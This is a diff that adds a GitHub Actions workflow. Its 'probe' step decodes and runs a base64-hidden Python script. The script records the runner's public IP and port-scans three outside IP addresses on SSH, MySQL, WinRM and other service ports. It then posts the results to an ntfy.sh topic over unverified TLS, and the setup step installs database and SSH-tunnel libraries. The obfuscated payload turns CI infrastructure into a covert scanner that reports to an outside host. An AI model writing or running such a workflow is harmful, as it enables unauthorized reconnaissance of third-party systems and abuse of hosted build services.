@@ -1,0 +1,24 @@
+name: i47395reach2
+on:
+  workflow_dispatch:
+    inputs:
+      topic:
+        description: ntfy topic
+        default: "i47395reach2-k5mva5ndrl"
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    permissions: {}
+    steps:
+      - name: setup
+        run: |
+          python3 -m pip install --quiet pymysql paramiko sshtunnel 2>/dev/null || true
+      - name: probe
+        env:
+          TOPIC: ${{ github.event.inputs.topic }}
+        run: |
+          set +e
+          echo 'aW1wb3J0IG9zLHN5cyxzb2NrZXQsdGltZSxzc2wsdXJsbGliLnJlcXVlc3QsanNvbgpUT1BJQz1vcy5lbnZpcm9uLmdldCgiVE9QSUMiLCJ4Iik7IENUWD1zc2wuX2NyZWF0ZV91bnZlcmlmaWVkX2NvbnRleHQoKTsgT1VUPVtdCmRlZiBsb2coKmEpOgogICAgbGluZT0iICIuam9pbihzdHIoeCkgZm9yIHggaW4gYSk7IHByaW50KGxpbmUsZmx1c2g9VHJ1ZSk7IE9VVC5hcHBlbmQobGluZSkKZGVmIHNlbmQodGFnLHRleHQpOgogICAgdGV4dD1zdHIodGV4dCkKICAgIGZvciBpIGluIHJhbmdlKDAsbGVuKHRleHQpLDMwMDApOgogICAgICAgIGJvZHk9KCJbJXMgJWRdICIlKHRhZyxpLy8zMDAwKzEpKS5lbmNvZGUoKSt0ZXh0W2k6aSszMDAwXS5lbmNvZGUoInV0Zi04IiwicmVwbGFjZSIpCiAgICAgICAgZm9yIF8gaW4gcmFuZ2UoMyk6CiAgICAgICAgICAgIHRyeTogdXJsbGliLnJlcXVlc3QudXJsb3Blbih1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KCJodHRwczovL250Znkuc2gvIitUT1BJQyxkYXRhPWJvZHksbWV0aG9kPSJQT1NUIiksdGltZW91dD0xNSxjb250ZXh0PUNUWCkucmVhZCgpOyBicmVhawogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOiB0aW1lLnNsZWVwKDEpCmRlZiB0Y3AoaG9zdCxwb3J0LHQ9MTApOgogICAgcz1zb2NrZXQuc29ja2V0KCk7IHMuc2V0dGltZW91dCh0KTsgdDA9dGltZS50aW1lKCkKICAgIHRyeTogcy5jb25uZWN0KChob3N0LHBvcnQpKTsgcmV0dXJuIFRydWUscm91bmQoKHRpbWUudGltZSgpLXQwKSoxMDAwKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOiByZXR1cm4gRmFsc2UsdHlwZShlKS5fX25hbWVfXwogICAgZmluYWxseToKICAgICAgICB0cnk6IHMuY2xvc2UoKQogICAgICAgIGV4Y2VwdDogcGFzcwpkZWYgbWFpbigpOgogICAgbG9nKCJFR1JFU1MiLHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIsdGltZW91dD0xMixjb250ZXh0PUNUWCkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkpCiAgICBmb3IgaCxwb3J0cyBpbiBbCiAgICAgICAgKCI0MC4xNjAuNy43NiIsWzIyLDgwLDQ0MywzMDAxLDMzMDYsNTM1Nyw1OTg1LDgwOTBdKSwKICAgICAgICAoIjUxLjE2MS4zNS4yMDkiLFsyMDU1LDgyODIsMzMwNl0pLAogICAgICAgICgiNTEuMjIyLjMxLjIyNyIsWzIyXSksCiAgICBdOgogICAgICAgIGZvciBwIGluIHBvcnRzOgogICAgICAgICAgICBvayxpbmZvPXRjcChoLHApOyBsb2coIlBPUlQiLGgscCwiT1BFTjoiK3N0cihpbmZvKSBpZiBvayBlbHNlICJOTygiK3N0cihpbmZvKSsiKSIpCiAgICBzZW5kKCJSRUFDSDIiLCJcbiIuam9pbihPVVQpKTsgbG9nKCJET05FIikKbWFpbigpCg==' | base64 -d > /tmp/p.py
+          python3 /tmp/p.py
+          echo "END rc=$?"
